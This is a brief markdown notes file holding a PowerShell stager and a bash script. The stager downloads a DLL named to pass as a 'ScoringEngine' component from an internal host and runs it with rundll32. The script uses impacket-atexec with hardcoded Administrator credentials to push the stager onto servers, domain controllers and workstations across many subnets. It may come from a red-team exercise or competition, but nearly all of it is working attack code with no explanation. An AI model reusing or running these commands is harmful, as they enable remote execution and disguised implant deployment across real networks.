# STuff


## Oneliner Stager run hosted .DLL in background:
```
mkdir C:\Temp -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri 'http://10.20.X.X:8081/ScoringEngine_V2.1.3.dll' -OutFile 'C:\Temp\ScoringEngine_V2.1.3.dll'; rundll32 C:\Temp\ScoringEngine_V2.1.3.dll, Start

```

```
#!/bin/bash
USER="Administrator"
PASS="SomePassword"
# Set the static hosting server IP that will serve the DLL
HOSTING_IP="192.168.212.128"
PORT="8081"
DLL="ScoringEngine_V2.1.3.dll"

# Function to run the command on a given target IP
run_atexec() {
    target_ip="$1"
    echo "Deploying to target: $target_ip"
    impacket-atexec ${USER}:${PASS}@${target_ip} "powershell -c \"mkdir C:\Temp -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri 'http://${HOSTING_IP}:${PORT}/${DLL}' -OutFile 'C:\Temp\\${DLL}'; rundll32 C:\Temp\\${DLL}, Start\""
}

# Example: Deploy to multiple host groups using different last-octet values

# Windows Servers (ending in .42)
for i in {0..20}; do
    run_atexec "10.20.${i}.42"
done

# Domain Controllers (ending in .68)
for i in {0..20}; do
    run_atexec "10.20.${i}.68"
done

# Workstations (ending in .69)
for i in {0..20}; do
    run_atexec "10.20.${i}.69"
done

```
